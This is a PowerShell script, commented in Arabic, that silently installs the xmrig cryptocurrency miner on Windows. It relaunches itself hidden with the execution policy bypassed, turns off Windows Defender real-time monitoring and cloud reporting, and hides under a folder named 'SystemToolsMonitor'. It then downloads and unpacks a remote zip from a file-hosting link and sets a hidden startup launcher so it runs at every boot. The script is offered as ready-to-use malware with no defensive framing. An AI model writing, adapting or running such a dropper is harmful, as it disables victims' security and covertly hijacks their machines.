# سكربت PowerShell لتثبيت xmrig بصمت، مع تسجيل كل شيء في ملف log

# إعداد المتغيرات
$folderName   = "SystemToolsMonitor"
$installPath  = "$env:APPDATA\$folderName"
$zipUrl       = "https://pixeldrain.com/api/file/v3eCFrde?download"  # ← غيّره بالرابط الفعلي
$zipPath      = "$env:TEMP\package_temp.zip"
$startupPath  = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$shortcutPath = "$startupPath\xmrig.vbs"
$logFile      = "$installPath\setup_log.txt"

# دالة لكتابة اللوج
function Write-Log {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $Message" | Out-File -FilePath $logFile -Append -Encoding UTF8
}

# تشغيل مخفي (فقط إذا لم يكن بالفعل يعمل كمخفي)
if (!$Host.UI.RawUI.WindowTitle) {
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "powershell.exe"
    $psi.Arguments = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File `"$PSCommandPath`""
    $psi.UseShellExecute = $false
    [System.Diagnostics.Process]::Start($psi)
    exit
}

try {
    Write-Log "🔧 بدء السكربت..."

    # إيقاف الحماية في الوقت الحقيقي
    Write-Log "⛔ محاولة إيقاف الحماية..."
    Set-MpPreference -DisableRealtimeMonitoring $true
    Set-MpPreference -MAPSReporting 0
    Set-MpPreference -SubmitSamplesConsent 2
    Set-MpPreference -CloudBlockLevel 0
    Set-MpPreference -DisableBlockAtFirstSeen $true
    Write-Log "✅ تم إيقاف الحماية."

} catch {
    Write-Log "❌ خطأ أثناء إيقاف الحماية: $_"
}

# إنشاء المجلد إذا مش موجود
try {
    if (-not (Test-Path $installPath)) {
        New-Item -ItemType Directory -Path $installPath -Force | Out-Null
        Write-Log "✅ تم إنشاء مجلد: $installPath"
    } else {
        Write-Log "ℹ️ المجلد موجود مسبقًا: $installPath"
    }
} catch {
    Write-Log "❌ خطأ أثناء إنشاء المجلد: $_"
}

# تحميل الملف
try {
    Write-Log "⬇️ جاري تحميل الملف من $zipUrl ..."
    Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing
    Write-Log "✅ تم التحميل إلى: $zipPath"
} catch {
    Write-Log "❌ خطأ أثناء التحميل: $_"
}

# فك الضغط
try {
    Write-Log "📦 جاري فك الضغط..."
    Expand-Archive -Path $zipPath -DestinationPath $installPath -Force
    Remove-Item $zipPath -Force
    Write-Log "✅ تم فك الضغط في: $installPath"
} catch {
    Write-Log "❌ خطأ أثناء فك الضغط: $_"
}

# إنشاء اختصار في بدء التشغيل
try {
    $vbsPath = Join-Path $installPath "xmrig_silent.vbs"
    if (Test-Path $vbsPath) {
        $WshShell = New-Object -ComObject WScript.Shell
        $Shortcut = $WshShell.CreateShortcut($shortcutPath)
        $Shortcut.TargetPath = $vbsPath
        $Shortcut.WorkingDirectory = $installPath
        $Shortcut.WindowStyle = 7
        $Shortcut.Save()
        Write-Log "✅ تم إنشاء اختصار بدء التشغيل: $shortcutPath"
    } else {
        Write-Log "⚠️ لم يتم العثور على xmrig_silent.vbs داخل: $installPath"
    }
} catch {
    Write-Log "❌ خطأ أثناء إنشاء الاختصار: $_"
}

Write-Log "🏁 السكربت اكتمل بنجاح."
